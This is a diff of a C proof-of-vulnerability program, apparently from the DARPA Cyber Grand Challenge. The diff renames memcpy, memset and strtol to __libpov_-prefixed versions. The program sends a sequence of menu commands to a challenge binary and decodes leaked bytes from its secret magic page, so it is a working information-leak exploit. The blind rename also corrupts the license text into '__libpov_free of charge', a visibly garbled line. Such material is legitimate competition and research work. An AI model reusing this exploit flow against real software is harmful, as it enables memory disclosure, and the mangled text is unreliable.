@@ -4,7 +4,7 @@ Author: Dan Czarnecki <cgc@cromulence.com>
 
 Copyright (c) 2016 Cromulence LLC
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
+Permission is hereby granted, __libpov_free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@@ -106,7 +106,7 @@ int CheckMatch(char *response, char *match, int length)
   return 0;
 }
 
-void *memcpy( void *pDest, const void *pSource, size_t nbytes )
+void *__libpov_memcpy( void *pDest, const void *pSource, size_t nbytes )
 {
   void *pDestReturn = pDest;
 
@@ -144,7 +144,7 @@ int main(void) {
   read_string(buffer, 256, '\n');
 
   // Select NEW_FILE
-  memcpy(buffer, "\x01", 1);
+  __libpov_memcpy(buffer, "\x01", 1);
   SendToCB(buffer, 1);
 
   // NEW_FILE selected message
@@ -152,7 +152,7 @@ int main(void) {
   read_string(buffer, 256, '\n');
 
   // padding data
-  memcpy(buffer, "\xc0\xc0", 2);
+  __libpov_memcpy(buffer, "\xc0\xc0", 2);
   SendToCB(buffer, 2);
 
   // flip the magic page bytes so it can be read properly
@@ -171,31 +171,31 @@ int main(void) {
   read_string(buffer, 256, '\n');
 
   // send Compress command
-  memcpy(buffer, "\x07", 1);
+  __libpov_memcpy(buffer, "\x07", 1);
   SendToCB(buffer, 1);
 
   // COMPRESS selected message
   read_string(buffer, 256, '\n');
 
   // send Decompress command
-  memcpy(buffer, "\x08", 1);
+  __libpov_memcpy(buffer, "\x08", 1);
   SendToCB(buffer, 1);
 
   // DECOMPRESS selected message
   read_string(buffer, 256, '\n');
 
   // send SHOW_PIXEL command
-  memcpy(buffer, "\x09", 1);
+  __libpov_memcpy(buffer, "\x09", 1);
   SendToCB(buffer, 1);
 
-  memset(buffer, 0, 256);
+  __libpov_memset(buffer, 0, 256);
 
   // SHOW_PIXEL selected
   read_string(buffer, 256, '\n');
   // Pixel selection prompt
   read_string(buffer, 256, '\n');
 
-  memcpy(buffer, "\x02\x02", 2);
+  __libpov_memcpy(buffer, "\x02\x02", 2);
   SendToCB(buffer, 2);
   //transmit(2, buffer, 64, &rxSize);
 
@@ -213,23 +213,23 @@ int main(void) {
   int secret1, secret2;
   char val1[5];
   char val2[5];
-  memcpy(val1, buffer+8, 4);
-  memcpy(val2, buffer+12, 4);
+  __libpov_memcpy(val1, buffer+8, 4);
+  __libpov_memcpy(val2, buffer+12, 4);
 
-  secret1 = (int)strtol(val1, &end, 16);
-  secret2 = (int)strtol(val2, &end, 16);
+  secret1 = (int)__libpov_strtol(val1, &end, 16);
+  secret2 = (int)__libpov_strtol(val2, &end, 16);
 
   secret1 = (secret1>>8) | (secret1<<8);
   secret2 = (secret2>>8) | (secret2<<8);
 
   unsigned char secret[4];
-  memcpy(secret, &secret1, 2);
-  memcpy(secret+2, &secret2, 2);
+  __libpov_memcpy(secret, &secret1, 2);
+  __libpov_memcpy(secret+2, &secret2, 2);
 
   // new line
   read_string(buffer, 256, '\n');
 
-  memcpy(buffer, "\x0b", 1);
+  __libpov_memcpy(buffer, "\x0b", 1);
   SendToCB(buffer, 1);
 
   // exit
